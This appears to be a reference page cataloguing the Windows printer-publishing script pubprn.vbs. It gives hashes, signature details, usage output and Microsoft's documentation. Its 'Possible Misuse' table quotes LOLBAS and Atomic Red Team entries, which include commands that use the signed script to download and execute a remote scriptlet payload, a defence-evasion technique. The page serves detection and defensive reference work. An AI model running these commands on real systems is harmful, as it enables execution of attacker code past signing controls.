---
title: pubprn.vbs | 
excerpt: What is pubprn.vbs?
---

# pubprn.vbs 

* File Path: `C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs`

## Hashes

Type | Hash
-- | --
MD5 | `D960FA3DAF18F891E2FF7F81C1AF1ADC`
SHA1 | `D94EDACC797907F8E0C953532BB0BCFE507CCE52`
SHA256 | `DEA23E3F89FAB599EE1F83BA57E12EDB01A53EC7B50F000483CF86DF54E6EEA1`
SHA384 | `18260EB66BF53CEAC97008C9E1B510DBD42F88A847A243ECB76048B135C732198041D66FF59ABAD76D6AD9E8238898AD`
SHA512 | `3AE7304EF00DBE978DE0947F81CAB2A2FF8A17A7C5AFA53C08128B7524251070FD8049D802254E723A9097BE83D87AB0D090E0E1BA1C261B22C14BDBEB0BCB2B`
SSDEEP | `384:ealJ9ReYSqbV8O2oR4GUANMXYRyby313tcyhJibu+3I+x:eaXe6buhoBUANMXY24FhJ/+4+x`
PESHA1 | `D94EDACC797907F8E0C953532BB0BCFE507CCE52`
PE256 | `DEA23E3F89FAB599EE1F83BA57E12EDB01A53EC7B50F000483CF86DF54E6EEA1`

## Runtime Data

### Usage (stdout):
```cmhg
Usage: [cscript] pubprn.vbs server "LDAP://OU=..,DC=..."
       server is a Windows server name (e.g.: Server) or UNC printer name (\\Server\Printer)
       "LDAP://CN=...,DC=..." is the DS path of the target container

Example 1: pubprn.vbs MyServer "LDAP://CN=MyContainer,DC=MyDomain,DC=Company,DC=Com"
Example 2: pubprn.vbs \\MyServer\Printer "LDAP://CN=MyContainer,DC=MyDomain,DC=Company,DC=Com"

```

### Loaded Modules:

Path |
-- |
C:\Windows\SYSTEM32\cscript.exe |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\SYSTEM32\ntdll.dll |


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: 
* Product Name: 
* Company Name: 
* File Version: 
* Product Version: 
* Language: 
* Legal Copyright: 

## File Scan

* VirusTotal Detections: 0/75
* VirusTotal Link: https://www.virustotal.com/gui/file/dea23e3f89fab599ee1f83ba57e12edb01a53ec7b50f000483cf86df54e6eea1/detection

## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\system32\Printing_Admin_Scripts\en-US\prnport.vbs](prnport.vbs-6D0114E9FBAE0DD8081C9A0D8F67D69F.md) | 32
[C:\Windows\system32\Printing_Admin_Scripts\en-US\prnqctl.vbs](prnqctl.vbs-11895A0FF5707A85D5C7C43C4AB73B18.md) | 35
[C:\Windows\system32\Printing_Admin_Scripts\en-US\pubprn.vbs](pubprn.vbs-C09F6C90E1DD04184030416D3C469206.md) | 50
[C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\prnport.vbs](prnport.vbs-96198EB7E50C0B72BBD5C1553DEB5915.md) | 40
[C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\prnqctl.vbs](prnqctl.vbs-3174AA250852ED50AC058E83A06482D0.md) | 38

## Possible Misuse

*The following table contains possible examples of `pubprn.vbs` being misused. While `pubprn.vbs` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Pubprn.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Pubprn.yml) | `Name: Pubprn.vbs`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Pubprn.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Pubprn.yml) | `- Command: pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Pubprn.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Pubprn.yml) | `- Path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Pubprn.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Pubprn.yml) | `- Path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #1: PubPrn.vbs Signed Script Bypass [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #1: PubPrn.vbs Signed Script Bypass [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216.001/T1216.001.md) | <code>PubPrn.vbs</code> is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and can be used to proxy execution from a remote site.(Citation: Enigma0x3 PubPrn Bypass) An example command is <code>cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>.</blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216.001/T1216.001.md) | - [Atomic Test #1 - PubPrn.vbs Signed Script Bypass](#atomic-test-1---pubprnvbs-signed-script-bypass) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216.001/T1216.001.md) | ## Atomic Test #1 - PubPrn.vbs Signed Script Bypass | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216.001/T1216.001.md) | Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216.001/T1216.001.md) | \| remote_payload \| A remote payload to execute using PubPrn.vbs. \| Url \| https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1216.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216.001/T1216.001.md) | cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:#{remote_payload}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)

## Additional Info*

**The information below is copied from [MicrosoftDocs](https://github.com/MicrosoftDocs/windowsserverdocs), which is maintained by [Microsoft](https://opensource.microsoft.com/codeofconduct/). Available under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license.*

---

## pubprn

> Applies to: Windows Server (Semi-Annual Channel), Windows Server 2019, Windows Server 2016, Windows Server 2012 R2, Windows Server 2012

Publishes a printer to the Active Directory Domain Services. This command is a Visual Basic script located in the `%WINdir%\System32\printing_Admin_Scripts\<language>` directory. To use this command at a command prompt, type **cscript** followed by the full path to the pubprn file, or change directories to the appropriate folder. For example: `cscript %WINdir%\System32\printing_Admin_Scripts\en-US\pubprn`.

### Syntax

```
cscript pubprn {<servername> | <UNCprinterpath>} LDAP://CN=<container>,DC=<container>
```

#### Parameters

| Parameter | Description |
|--|--|
| `<servername>` | Specifies the name of the Windows server that hosts the printer that you want to publish. If you don't specify a computer, the local computer is used. |
| `<UNCprinterpath>` | The Universal Naming Convention (UNC) path to the shared printer that you want to publish. |
| `LDAP://CN=<Container>,DC=<Container>` | Specifies the path to the container in Active Directory Domain Services where you want to publish the printer. |
| /? | Displays help at the command prompt. |

##### Remarks

- If the information that you supply contains spaces, use quotation marks around the text (for example, "Computer Name").

#### Examples

To publish all printers on the \\Server1 computer to the MyContainer container in the MyDomain.company.com domain, type:

```
cscript pubprn Server1 LDAP://CN=MyContainer,DC=MyDomain,DC=company,DC=Com
```

To publish the Laserprinter1 printer on the \\\Server1 server to the MyContainer container in the MyDomain.company.com domain, type:

```
cscript pubprn \\Server1\Laserprinter1 LDAP://CN=MyContainer,DC=MyDomain,DC=company,DC=Com
```

### Additional References

- [Command-Line Syntax Key](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md)

- [Print Command Reference](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/print-command-reference.md)

---



MIT License. Copyright (c) 2020-2021 Strontic.


